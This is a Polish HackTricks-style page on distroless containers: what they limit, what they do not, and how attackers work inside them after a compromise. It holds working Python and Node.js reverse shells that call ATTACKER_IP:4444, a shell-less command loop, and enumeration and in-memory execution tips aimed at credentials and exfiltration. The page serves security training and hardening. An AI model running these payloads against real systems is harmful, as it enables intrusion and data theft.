# Kontenery Distroless

{{#include ../../../banners/hacktricks-training.md}}

## Przegląd

Obraz kontenera **distroless** to obraz zawierający **minimalne komponenty runtime wymagane do uruchomienia jednej konkretnej aplikacji**, celowo pozbawiony typowych narzędzi dystrybucji, takich jak package managers, shelle oraz duże zestawy ogólnych narzędzi userland. W praktyce obrazy distroless często zawierają wyłącznie binarium aplikacji lub runtime, jego shared libraries, zestawy certyfikatów oraz bardzo mały układ systemu plików.

Nie chodzi o to, że distroless jest nowym mechanizmem izolacji kernela. Distroless to **strategia projektowania obrazu**. Zmienia to, co jest dostępne **wewnątrz** filesystemu kontenera, ale nie sposób, w jaki kernel izoluje kontener. To rozróżnienie ma znaczenie, ponieważ distroless hardenuje środowisko głównie przez ograniczenie tego, czego atakujący może użyć po uzyskaniu code execution. Nie zastępuje namespaces, seccomp, capabilities, AppArmor, SELinux ani żadnego innego mechanizmu izolacji runtime.

## Dlaczego Istnieje Distroless

Obrazy distroless są przede wszystkim używane w celu ograniczenia:

- rozmiaru obrazu
- złożoności operacyjnej obrazu
- liczby packages i binaries, które mogą zawierać vulnerabilities
- liczby narzędzi post-exploitation dostępnych domyślnie dla atakującego

Dlatego obrazy distroless są popularne w produkcyjnych wdrożeniach aplikacji. Kontener, który nie zawiera shella, package managera i niemal żadnych ogólnych narzędzi, jest zwykle łatwiejszy do operacyjnego zrozumienia i trudniejszy do interaktywnego wykorzystania po kompromitacji.

Przykłady dobrze znanych rodzin obrazów w stylu distroless obejmują:

- obrazy distroless firmy Google
- hardened/minimal images firmy Chainguard

## Czego Nie Oznacza Distroless

Kontener distroless **nie jest**:

- automatycznie rootless
- automatycznie non-privileged
- automatycznie read-only
- automatycznie chroniony przez seccomp, AppArmor lub SELinux
- automatycznie bezpieczny przed container escape

Nadal można uruchomić obraz distroless z `--privileged`, współdzieleniem host namespaces, niebezpiecznymi bind mounts lub zamontowanym runtime socket. W takim scenariuszu obraz może być minimalny, ale kontener nadal może być katastrofalnie niezabezpieczony. Distroless zmienia **userland attack surface**, a nie **kernel trust boundary**.

## Typowe Charakterystyki Operacyjne

Gdy skompromitujesz kontener distroless, pierwszą rzeczą, którą zwykle zauważysz, jest to, że typowe założenia przestają być prawdziwe. Może nie być `sh`, `bash`, `ls`, `id`, `cat`, a czasami nawet środowiska opartego na libc, które zachowywałoby się tak, jak oczekuje tego Twój typowy tradecraft. Wpływa to zarówno na offense, jak i defense, ponieważ brak narzędzi sprawia, że debugging, incident response i post-exploitation wyglądają inaczej.

Najczęstsze wzorce to:

- application runtime istnieje, ale niewiele więcej
- shell-based payloads zawodzą, ponieważ nie ma shella
- typowe one-linery do enumeration zawodzą, ponieważ brakuje helper binaries
- zabezpieczenia filesystemu, takie jak read-only rootfs lub `noexec` w zapisywalnych lokalizacjach tmpfs, są również często obecne

To połączenie zwykle prowadzi do mówienia o „weaponizing distroless”.

## Distroless I Post-Exploitation

Głównym wyzwaniem offensive w środowisku distroless nie zawsze jest początkowe RCE. Często ważniejsze jest to, co następuje później. Jeśli zaatakowany workload zapewnia code execution w language runtime, takim jak Python, Node.js, Java lub Go, możesz mieć możliwość wykonywania dowolnej logiki, ale nie za pomocą typowych shell-centric workflows, powszechnych na innych targetach Linux.

Oznacza to, że post-exploitation często zmierza w jednym z trzech kierunków:

1. **Bezpośrednie użycie dostępnego language runtime** do enumeration środowiska, otwierania sockets, odczytywania plików lub przygotowywania dodatkowych payloads.
2. **Dostarczenie własnych narzędzi do pamięci** w sytuacji, gdy filesystem jest read-only lub zapisywalne lokalizacje są zamontowane z `noexec`.
3. **Wykorzystanie istniejących binaries obecnych już w obrazie**, jeśli aplikacja lub jej dependencies zawierają coś niespodziewanie użytecznego.

## Abuse

### Enumerate The Runtime You Already Have

W wielu kontenerach distroless nie ma shella, ale nadal istnieje application runtime. Jeśli targetem jest serwis Python, Python jest dostępny. Jeśli targetem jest Node.js, Node jest dostępny. Często zapewnia to wystarczającą funkcjonalność do enumeration plików, odczytywania zmiennych środowiskowych, otwierania reverse shells i przygotowywania in-memory execution bez wywoływania `/bin/sh`.

Prosty przykład z Python:
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
Prosty przykład z Node.js:
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
Wpływ:

- odzyskanie zmiennych środowiskowych, często zawierających dane uwierzytelniające lub endpointy usług
- enumeracja systemu plików bez `/bin/ls`
- identyfikacja ścieżek z prawem zapisu i zamontowanych sekretów

### Reverse Shell Bez `/bin/sh`

Jeśli obraz nie zawiera `sh` ani `bash`, klasyczny reverse shell oparty na shellu może natychmiast zakończyć się niepowodzeniem. W takiej sytuacji użyj zainstalowanego runtime'u języka.

Reverse shell w Pythonie:
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
Jeśli `/bin/sh` nie istnieje, zastąp ostatnią linię bezpośrednim wykonywaniem poleceń sterowanym przez Python lub pętlą REPL języka Python.

Node reverse shell:
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
Ponownie, jeśli `/bin/sh` nie jest dostępny, użyj bezpośrednio API systemu plików, procesów i sieci Node zamiast uruchamiać shell.

### Pełny przykład: pętla poleceń Python bez shella

Jeśli obraz zawiera Python, ale nie ma w ogóle shella, prosta interaktywna pętla często wystarcza, aby zachować pełne możliwości post-exploitation:
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
Nie wymaga to interaktywnego pliku binarnego powłoki. Z perspektywy atakującego wpływ jest praktycznie taki sam jak w przypadku podstawowej powłoki: wykonywanie poleceń, enumeracja oraz przygotowywanie kolejnych payloadów za pośrednictwem istniejącego runtime.

### Wykonywanie narzędzi w pamięci

Obrazy Distroless są często używane razem z:

- `readOnlyRootFilesystem: true`
- zapisywalnym, ale `noexec` tmpfs, takim jak `/dev/shm`
- brakiem narzędzi do zarządzania pakietami

Takie połączenie sprawia, że klasyczne procedury typu „pobierz plik binarny na dysk i uruchom go” są zawodne. W takich przypadkach techniki wykonywania w pamięci stają się głównym rozwiązaniem.

Dedykowana strona znajduje się tutaj:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Najbardziej istotne techniki opisane na tej stronie to:

- `memfd_create` + `execve` za pośrednictwem scripting runtimes
- DDexec / EverythingExec
- memexec
- memdlopen

### Istniejące pliki binarne znajdujące się już w obrazie

Niektóre obrazy Distroless nadal zawierają pliki binarne niezbędne operacyjnie, które stają się przydatne po przejęciu. Często obserwowanym przykładem jest `openssl`, ponieważ aplikacje czasami potrzebują go do zadań związanych z kryptografią lub TLS.

Szybki wzorzec wyszukiwania to:
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
Jeśli obecny jest `openssl`, może być użyteczny do:

- outbound TLS connections
- data exfiltration przez dozwolony kanał egress
- staging payload data za pośrednictwem zakodowanych/zaszyfrowanych blobów

Dokładny sposób abuse zależy od tego, co faktycznie jest zainstalowane, ale ogólna idea jest taka, że distroless nie oznacza „całkowitego braku narzędzi”; oznacza „znacznie mniej narzędzi niż w standardowym obrazie dystrybucji”.

## Kontrole

Celem tych kontroli jest ustalenie, czy obraz jest rzeczywiście distroless w praktyce oraz które runtime lub helper binaries są nadal dostępne na potrzeby post-exploitation.
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
Co jest tutaj interesujące:

- Jeśli nie istnieje żaden shell, ale dostępny jest runtime, taki jak Python lub Node, post-exploitation powinno przejść na wykonanie sterowane przez runtime.
- Jeśli root filesystem jest tylko do odczytu, a `/dev/shm` jest zapisywalny, ale ma ustawione `noexec`, techniki wykonywania w pamięci stają się znacznie bardziej istotne.
- Jeśli istnieją helper binaries, takie jak `openssl`, `busybox` lub `java`, mogą oferować wystarczającą funkcjonalność do uzyskania dalszego dostępu.

## Domyślne ustawienia runtime

| Styl obrazu / platformy | Stan domyślny | Typowe zachowanie | Częste ręczne osłabienie zabezpieczeń |
| --- | --- | --- | --- |
| Obrazy w stylu Google distroless | Celowo minimalny userland | Brak shella, package managera i wyłącznie zależności aplikacji/runtime | dodawanie warstw debuggingowych, sidecar shelli, kopiowanie busyboxa lub narzędzi |
| Minimalne obrazy Chainguard | Celowo minimalny userland | Ograniczona powierzchnia pakietów, często skoncentrowana na jednym runtime lub serwisie | używanie wariantów `:latest-dev` lub debug, kopiowanie narzędzi podczas builda |
| Workloady Kubernetes używające obrazów distroless | Zależy od konfiguracji Pod | Distroless wpływa wyłącznie na userland; poziom bezpieczeństwa Pod nadal zależy od specyfikacji Pod i domyślnych ustawień runtime | dodawanie ephemeral debug containers, mountów hosta, uprzywilejowanych ustawień Pod |
| Docker / Podman uruchamiające obrazy distroless | Zależy od flag uruchomieniowych | Minimalny filesystem, ale bezpieczeństwo runtime nadal zależy od flag i konfiguracji daemona | `--privileged`, współdzielenie namespace'ów hosta, mounty socketów runtime, zapisywalne bind mounty hosta |

Kluczowa kwestia jest taka, że distroless to **właściwość obrazu**, a nie ochrona runtime. Jego wartość wynika z ograniczenia tego, co jest dostępne wewnątrz filesystemu po kompromitacji.

## Powiązane strony

Informacje o obejściach zabezpieczeń filesystemu i wykonywaniu w pamięci, które są często potrzebne w środowiskach distroless:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Informacje o nadużywaniu container runtime, socketów i mountów, które nadal dotyczą workloadów distroless:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

{{#include ../../../banners/hacktricks-training.md}}
